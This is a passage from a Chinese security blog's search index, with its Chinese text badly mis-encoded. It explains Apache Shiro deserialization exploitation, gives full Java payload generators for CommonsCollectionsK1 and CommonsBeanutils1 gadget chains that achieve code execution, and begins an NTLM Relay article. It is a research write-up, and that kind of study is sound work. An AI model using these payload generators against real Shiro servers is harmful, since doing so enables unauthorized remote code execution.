ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.3 ä¸åŒ…å«æ•°ç»„çš„ååºåˆ—åŒ– Gadget è¿™é‡Œåˆ©ç”¨ wh1t3p1g çš„æ€è·¯ã€‚ä½¿ç”¨ TemplatesImpl.newTransformer å‡½æ•°æ¥åŠ¨æ€ loadClass æ„é€ å¥½çš„evil class bytesã€‚å¹¶ä¸”åœ¨è¿™éƒ¨åˆ†åˆ©ç”¨é“¾ä¸Šæ˜¯ä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡çš„ã€‚ å¦‚ä½•è§¦å‘TemplatesImpl.newTransformerçš„æ–¹æ³•ï¼Ÿ å…ˆæ¥å›é¡¾ä¸€ä¸‹ CommonsCollections2 çš„åˆ©ç”¨é“¾ï¼š PriorityQueue.readObject -\u003e PriorityQueue.heapify() -\u003e PriorityQueue.siftDown() -\u003e PriorityQueue.siftDownUsingComparator() -\u003e TransformingComparator.compare() -\u003e InvokerTransformer.transform() -\u003e TemplatesImpl.newTransformer() ... templates Gadgets ... -\u003e Runtime.getRuntime().exec() åœ¨è¿™æ¡é“¾ä¸Šï¼Œç”±äº TransformingComparator åœ¨ 3.2.1 çš„ç‰ˆæœ¬ä¸Šè¿˜æ²¡æœ‰å®ç° Serializable æ¥å£ï¼Œå…¶åœ¨ 3.2.1 ç‰ˆæœ¬ä¸‹æ˜¯æ— æ³•ååºåˆ—åŒ–çš„ã€‚æ‰€ä»¥æ— æ³•ç›´æ¥åˆ©ç”¨è¯¥payloadæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚ åœ¨ InvokerTransformer.transform() ä¸­ï¼Œæ ¹æ®ä¼ å…¥çš„ input å¯¹è±¡ï¼Œè°ƒç”¨å…¶ iMethodName æ–¹æ³•ã€‚å¦‚æœæ­¤æ—¶ä¼ å…¥çš„ input ä¸ºæ„é€ å¥½çš„ TemplatesImpl å¯¹è±¡å‘¢ï¼Ÿè¿™æ ·å°±å¯ä»¥é€šè¿‡å°† iMethodName ç½®ä¸º newTransformerï¼Œä»è€Œå®Œæˆåç»­çš„ templates gadgetsã€‚ åœ¨ ysoserial çš„åˆ©ç”¨é“¾ä¸­ï¼Œå…³äº transform å‡½æ•°æ¥æ”¶çš„ input å­˜åœ¨ä¸¤ç§æƒ…å†µï¼š é…åˆ ChainedTransformer æ— æ„ä¹‰çš„ Stringï¼Œè¿™é‡Œçš„æ— æ„ä¹‰çš„ String æŒ‡çš„æ˜¯ä¼ å…¥åˆ° ConstantTransformer.transform å‡½æ•°çš„ inputï¼Œè¯¥ transform å‡½æ•°ä¸ä¾èµ– inputï¼Œè€Œç›´æ¥è¿”å› iConstant ä» CommonsCollection6 å¼€å§‹ï¼Œç”¨åˆ°äº† TiedMapEntryï¼Œå…¶ä½œä¸ºä¸­ç»§ï¼Œè°ƒç”¨äº† LazyMapï¼ˆmapï¼‰çš„ get å‡½æ•°ã€‚ å…¶ä¸­ map å’Œ key éƒ½å¯ä»¥æ§åˆ¶ï¼Œè€Œ LazyMap.get è°ƒç”¨äº† transform å‡½æ•°ï¼Œå¹¶å°†å¯æ§çš„ key ä¼ å…¥ transform å‡½æ•°ï¼š è¿™æ ·å°±å°†æ„é€ å¥½çš„ TemplatesImplï¼ˆkeyï¼‰ä½œä¸º InvokerTransformer.transform å‡½æ•°çš„ input ä¼ å…¥ï¼Œå°±å¯ä»¥æŠŠ templates gadgets ä¸²èµ·æ¥äº†ã€‚ è¿™é‡Œæ•´ç†ä¸€ä¸‹è¿™æ¡é“¾çš„è°ƒç”¨è¿‡ç¨‹ï¼š java.util.HashSet.readObject() -\u003e java.util.HashMap.put() -\u003e java.util.HashMap.hash() -\u003e org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -\u003e org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -\u003e org.apache.commons.collections.map.LazyMap.get() -\u003e org.apache.commons.collections.functors.InvokerTransformer.transform() -\u003e java.lang.reflect.Method.invoke() ... templates gadgets ... -\u003e java.lang.Runtime.exec() ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:3","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 å®æˆ˜ - CommonsCollectionsK1 é¦–å…ˆè¿˜æ˜¯åˆ›å»º TemplatesImpl å¯¹è±¡ï¼š TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {\"...bytescode\"}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); åˆ›å»ºä¸€ä¸ªç”¨æ¥è°ƒç”¨ newTransformer æ–¹æ³•çš„ InvokerTransformerï¼Œä½†æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶å…ˆä¼ å…¥ä¸€ä¸ªæ­£å¸¸çš„æ–¹æ³•ï¼Œæ¯”å¦‚ getClass ï¼Œé¿å…æ¶æ„æ–¹æ³•åœ¨æ„é€  Gadget çš„æ—¶å€™è§¦å‘ï¼š Transformertransformer = new InvokerTransformer(\"getClass\",null,null); å†æŠŠä¹‹å‰çš„ CommonsCollections6 çš„ä»£ç å¤åˆ¶è¿‡æ¥ï¼Œå°†åŸæ¥ TiedMapEntry æ„é€ æ—¶çš„ç¬¬äºŒä¸ªå‚æ•° keyï¼Œæ”¹ä¸ºå‰é¢åˆ›å»ºçš„ TemplatesImpl å¯¹è±¡ï¼š Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š package com.govuln.shiroattack; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } } è¿™ä¸€ä¸ª Gadget å…¶å®ä¹Ÿå°±æ˜¯ XRay å’Œ Koalr å¸ˆå‚…çš„ CommonsCollectionsK1 ç”¨æ¥æ£€æµ‹ Shiro-550 çš„æ–¹æ³•ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"5 CommonsBeanutils1 Gadget åˆ†æ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"5.1 èƒŒæ™¯ Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€š Java ç±»å¯¹è±¡(ä¹Ÿç§°ä¸º JavaBean)çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚ å¦‚ Cat æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ JavaBean ç±»ï¼šå®ƒåŒ…å«ä¸€ä¸ªç§æœ‰å±æ€§ nameï¼Œå’Œè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆç§°ä¸º getter å’Œ setterã€‚å…¶ä¸­ï¼Œgetter çš„æ–¹æ³•åä»¥ get å¼€å¤´ï¼Œsetter çš„æ–¹æ³•åä»¥ set å¼€å¤´ï¼Œ final public class Cat { private String name = \"catalina\"; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• PropertyUtils.getProperty ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼Œæ¯”å¦‚ï¼šPropertyUtils.getProperty(new Cat(), \"name\"); æ­¤æ—¶ï¼Œcommons-beanutils ä¼šè‡ªåŠ¨æ‰¾åˆ° name å±æ€§çš„ getter æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getNameï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œ PropertyUtils.getProperty è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚ a å¯¹è±¡ä¸­æœ‰å±æ€§ bï¼Œb å¯¹è±¡ä¸­æœ‰å±æ€§ cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ PropertyUtils.getProperty(a, \"b.c\"); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¯¥æ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„ getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®š JavaBean æ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:1","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"5.2 åˆ†æ å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ java.util.Comparator å¯¹è±¡ï¼Œåœ¨ commons-beanutils åŒ…ä¸­å­˜åœ¨: org.apache.commons.beanutils.BeanComparator ï¼Œç”¨æ¥æ¯”è¾ƒä¸¤ä¸ª JavaBean æ˜¯å¦ç›¸ç­‰çš„ç±»ï¼Œå…¶å®ç°äº† java.util.Comparator æ¥å£ã€‚æˆ‘ä»¬çœ‹å®ƒçš„ compare æ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚å¦‚æœ this.property ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ PropertyUtils.getProperty åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ this.property å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼ã€‚PropertyUtils.getProperty è¿™ä¸ªæ–¹æ³•ä¼šè‡ªåŠ¨å»è°ƒç”¨ä¸€ä¸ª JavaBeançš„getter æ–¹æ³•ï¼Œ è¿™ä¸ªç‚¹æ˜¯ä»»æ„ä»£ç æ‰§è¡Œçš„å…³é”®ã€‚ åœ¨åˆ†æ TemplatesImpl åˆ©ç”¨é“¾çš„æ–‡ç« ä¸­æŒ‡å‡ºï¼ŒTemplatesImpl#getOutputProperties() æ–¹æ³•æ˜¯è°ƒç”¨é“¾ä¸Šçš„ä¸€ç¯ï¼Œå®ƒçš„å†…éƒ¨è°ƒç”¨äº† TemplatesImpl#newTransformer() ï¼Œä¹Ÿå°±æ˜¯åé¢å¸¸ç”¨æ¥æ‰§è¡Œæ¶æ„å­—èŠ‚ç çš„æ–¹æ³•ï¼š è€Œ getOutputProperties è¿™ä¸ªåå­—ï¼Œæ˜¯ä»¥ get å¼€å¤´ï¼Œæ­£ç¬¦åˆ getter çš„å®šä¹‰ã€‚ æ„é€ çš„ POC å¦‚ä¸‹ï¼š import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CB1Demo { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/ClassLoaderVuln/http/HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); // åºåˆ—åŒ– ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); // ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } é¦–å…ˆåˆ›å»º TemplateImplã€‚ç„¶åå®ä¾‹åŒ– BeanComparator ã€‚ BeanComparator æ„é€ å‡½æ•°ä¸ºç©ºæ—¶ï¼Œé»˜è®¤çš„ property å°±æ˜¯ç©ºã€‚å†ç”¨åˆšåˆšçš„ comparator å®ä¾‹åŒ–ä¼˜å…ˆé˜Ÿåˆ— PriorityQueue ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ä¸­æ·»åŠ äº†ä¸¤ä¸ªæ— å®³çš„å¯ä»¥æ¯”è¾ƒçš„å¯¹è±¡è¿›é˜Ÿåˆ—ä¸­ã€‚å‰æ–‡è¯´è¿‡ï¼Œ BeanComparator#compare() ä¸­ï¼Œ å¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚è¿™é‡Œå®é™…ä¸Šå°±æ˜¯å¯¹ä¸¤ä¸ª 1 è¿›è¡Œæ’åºã€‚ æœ€åï¼Œå†ç”¨åå°„å°† property çš„å€¼è®¾ç½®æˆæ¶æ„çš„ outputProperties ï¼Œå°†é˜Ÿåˆ—é‡Œçš„ä¸¤ä¸ª 1 æ›¿æ¢æˆæ¶æ„çš„ TemplateImpl å¯¹è±¡ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:2","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"6 CB1 åœ¨ Shiro ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨ åœ¨å‰é¢çš„æ¼æ´ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬æ˜¯æ‰‹åŠ¨æ·»åŠ äº† Commons Collections ä¾èµ–ã€‚åœ¨å®é™…åœºæ™¯ä¸­ï¼Œç›®æ ‡ç³»ç»Ÿä¸ä¸€å®šä¼šå®‰è£… Commons Collections åº“ã€‚è€Œ commons-beanutils é»˜è®¤æ·»åŠ ã€‚ å°è¯•ä½¿ç”¨ä¸Šæ–‡çš„ CB1 ç›´æ¥æ„é€  payloadï¼Œå¹¶å‘é€ï¼Œå‘ç°æ˜¯å¤±è´¥çš„ï¼Œæç¤º serialVersionUID ä¸ä¸€è‡´ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"6.1 serialVersionUID å¦‚æœä¸¤ä¸ªä¸åŒç‰ˆæœ¬çš„åº“ä½¿ç”¨äº†åŒä¸€ä¸ªç±»ï¼Œè€Œè¿™ä¸¤ä¸ªç±»å¯èƒ½æœ‰ä¸€äº›æ–¹æ³•å’Œå±æ€§æœ‰äº†å˜åŒ–ï¼Œæ­¤æ—¶åœ¨åºåˆ—åŒ–é€šä¿¡çš„æ—¶å€™å°±å¯èƒ½å› ä¸ºä¸å…¼å®¹å¯¼è‡´å‡ºç°éšæ‚£ã€‚å› æ­¤ï¼ŒJava åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æä¾›äº†ä¸€ä¸ªæœºåˆ¶ï¼Œåºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å›ºå®šç®—æ³•è®¡ç®—å‡ºä¸€ä¸ªå½“å‰ç±»çš„ serialVersionUID å€¼ï¼Œå†™å…¥æ•°æ®æµä¸­ ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœå‘ç°å¯¹æ–¹çš„ç¯å¢ƒä¸­è¿™ä¸ªç±»è®¡ç®—å‡ºçš„ serialVersionUID ä¸åŒï¼Œåˆ™ååºåˆ—åŒ–è¿‡ç¨‹å°±ä¸¢å¼‚å¸¸å¹¶é€€å‡ºæ‰§è¡Œï¼Œé¿å…åç»­çš„æœªçŸ¥éšæ‚£ã€‚ æ‰€ä»¥ï¼Œå‡ºç°é”™è¯¯çš„åŸå› å°±æ˜¯ï¼Œæœ¬åœ°ä½¿ç”¨çš„ commons-beanutils æ˜¯ 1.9.2 ç‰ˆæœ¬ï¼Œè€Œ Shiro ä¸­è‡ªå¸¦çš„ commons-beanutils æ˜¯ 1.8.3 ç‰ˆæœ¬ï¼Œå‡ºç°äº† serialVersionUID å¯¹åº”ä¸ä¸Šçš„é—®é¢˜ã€‚ æ›´æ¢ç‰ˆæœ¬åï¼Œå†æ¬¡ç”Ÿæˆ Payload è¿›è¡Œæµ‹è¯•ï¼Œæ­¤æ—¶ Tomcat ç«¯çˆ†å‡ºäº†å¦ä¸€ä¸ªå¼‚å¸¸ï¼Œä»ç„¶æ²¡æœ‰è§¦å‘ä»£ç æ‰§è¡Œï¼š Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] ç®€å•æ¥è¯´å°±æ˜¯æ²¡æ‰¾åˆ° org.apache.commons.collections.comparators.ComparableComparator ç±»ï¼Œä»åŒ…åå³å¯çœ‹å‡ºï¼Œè¿™ä¸ªç±»æ˜¯æ¥è‡ªäº commons-collectionsã€‚ commons-beanutils æœ¬æ¥ä¾èµ–äº commons-collectionsï¼Œä½†æ˜¯åœ¨ Shiro ä¸­ï¼Œå®ƒçš„ commons-beanutils è™½ç„¶åŒ…å«äº†ä¸€éƒ¨åˆ† commons-collections çš„ç±»ï¼Œä½†å´ä¸å…¨ã€‚è¿™ä¹Ÿå¯¼è‡´ï¼Œæ­£å¸¸ä½¿ç”¨ Shiro çš„æ—¶å€™ä¸éœ€è¦ä¾èµ–äº commons-collectionsï¼Œä½†ååºåˆ—åŒ–åˆ©ç”¨çš„æ—¶å€™éœ€è¦ä¾èµ–äºcommons-collectionsã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:1","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"6.2 æ— ä¾èµ–çš„ Shiro ååºåˆ—åŒ– Gadget é¦–å…ˆç¡®è®¤ org.apache.commons.collections.comparators.ComparableComparator è¿™ä¸ªç±»çš„ä½¿ç”¨æƒ…å†µï¼š åœ¨ BeanComparator ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥ Comparator çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ ComparableComparator ã€‚ æ—¢ç„¶æ­¤æ—¶æ²¡æœ‰ ComparableComparator ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š å®ç° java.util.Comparator æ¥å£ å®ç° java.io.Serializable æ¥å£ Javaã€shiro æˆ– commons-beanutils è‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º é€šè¿‡ IDEA çš„ Implementation å¯»æ‰¾å®ç°äº† Comparator çš„ç±»ï¼š ä»£ç å¦‚ä¸‹ï¼š CaseInsensitiveComparator ç±»æ˜¯ java.lang.String ç±»ä¸‹çš„ä¸€ä¸ªå†…éƒ¨ç§æœ‰ç±»ï¼Œå…¶å®ç°äº† Comparator å’Œ Serializable ï¼Œä¸”ä½äº Java çš„æ ¸å¿ƒä»£ç ä¸­ï¼Œå…¼å®¹æ€§å¼ºã€‚ é€šè¿‡ String.CASE_INSENSITIVE_ORDER å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„ CaseInsensitiveComparator å¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– BeanComparator : final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); æ„é€ å‡ºæ–°çš„ CommonsBeanutils1Shiro åˆ©ç”¨é“¾ï¼š import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); // stub data for replacement later queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:2","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ phith0n Java æ¼«è°ˆç³»åˆ— Shiro RememberMe 1.2.4 ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:7:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æœ¬æ–‡ç¿»è¯‘è‡ª hackndo çš„ NTLM Relayï¼Œä¹‹å‰åœ¨å­¦ä¹  NTLM Relay æ—¶å‚è€ƒè¿‡ï¼Œç°åœ¨æ‹¿å‡ºæ¥ remark ä¸€ä¸‹","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 NTLM åè®® ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 ç®€ä»‹ NTLM åè®®æ˜¯ä¸€ä¸ªåœ¨å¾®è½¯ç¯å¢ƒä¸­ä½¿ç”¨çš„è®¤è¯åè®®ã€‚è¯¥åè®®å…è®¸ç”¨æˆ·å‘æœåŠ¡å™¨è¯æ˜å…¶èº«ä»½ï¼Œä»¥ä¾¿ä½¿ç”¨è¯¥æœåŠ¡å™¨æä¾›çš„æœåŠ¡ã€‚ æœ‰ä¸¤ç§è®¤è¯çš„åœºæ™¯ï¼š å·¥ä½œç»„ç¯å¢ƒ ç”¨æˆ·ä½¿ç”¨æœåŠ¡å™¨æœ¬åœ°å¸æˆ·çš„å¯†é’¥ã€‚ç”±äºæœåŠ¡å™¨åœ¨å…¶æœ¬åœ°æ•°æ®åº“ä¸­æ‹¥æœ‰ç”¨æˆ·çš„å¯†é’¥ï¼Œèƒ½å¤Ÿå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼› åŸŸç¯å¢ƒ åœ¨ Active Directory ç¯å¢ƒä¸­ï¼Œç”¨æˆ·åœ¨èº«ä»½éªŒè¯æœŸé—´ä½¿ç”¨åŸŸå¸æˆ·ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å°†å‘åŸŸæ§å‘é€ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ã€‚ åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼ŒNTLM è®¤è¯å§‹äºå®¢æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ã€ŒæŒ‘æˆ˜/å“åº”ã€æœºåˆ¶ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM 